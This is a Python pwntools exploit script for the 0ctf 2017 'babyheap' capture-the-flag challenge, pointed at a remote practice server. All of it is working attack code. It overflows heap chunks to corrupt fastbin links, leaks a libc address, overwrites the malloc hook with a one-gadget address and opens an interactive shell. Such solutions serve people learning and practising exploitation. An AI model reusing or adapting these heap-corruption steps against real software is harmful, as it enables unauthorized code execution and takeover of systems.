from pwn import *

#p = process("./0ctf_2017_babyheap")
p = remote("node4.buuoj.cn",28880)

#context.log_level = 'debug'
def allo(size):
	p.recvuntil("Command: ")
	p.sendline(str(1))
	p.recvuntil("Size: ")
	p.sendline(str(size))

def fill(idx,size,content):
	p.recvuntil("Command: ")
	p.sendline(str(2))
	p.recvuntil("Index: ")
	p.sendline(str(idx))
	p.recvuntil("Size: ")
	p.sendline(str(size))
	p.recvuntil("Content: ")
	p.sendline(content)

def free(idx):
	p.recvuntil("Command: ")
	p.sendline(str(3))
	p.recvuntil("Index: ")
	p.sendline(str(idx))

def dump(idx):
	p.recvuntil("Command: ")
	p.sendline(str(4))
	p.recvuntil("Index: ")
	p.sendline(str(idx))

allo(0x10)#0
allo(0x10)#1
allo(0x10)#2
allo(0x10)#3
allo(0x80)#4

free(1)
free(2)

payload = p64(0)*3 + p64(0x21) + p64(0)*3 + p64(0x21)
payload += p8(0x80)
fill(0,len(payload),payload)

payload = p64(0)*3 + p64(0x21)
fill(3,len(payload),payload)

allo(0x10)#1 The original position of 2
allo(0x10)#2 4 Simultaneous pointing

payload = p64(0)*3 + p64(0x91)
fill(3,len(payload),payload)

allo(0x80)

free(4)

dump(2)
content = u64(p.recvuntil('\x7f')[-6:]+b'\x00\x00')
print(hex(content))
libc_base = (content) - 0x3c4b78
print(hex(libc_base))

allo(0x60)

free(4)
payload = p64(libc_base + 0x3C4AED)
fill(2,len(payload),payload)

allo(0x60)
allo(0x60)
#gdb.attach(p)
pause()


payload = b'a'*(0x8+0x2+0x8+1)
payload += p64(libc_base+0x4526a)

fill(6,len(payload),payload)

allo(79)
# gdb.attach(p)
p.interactive()

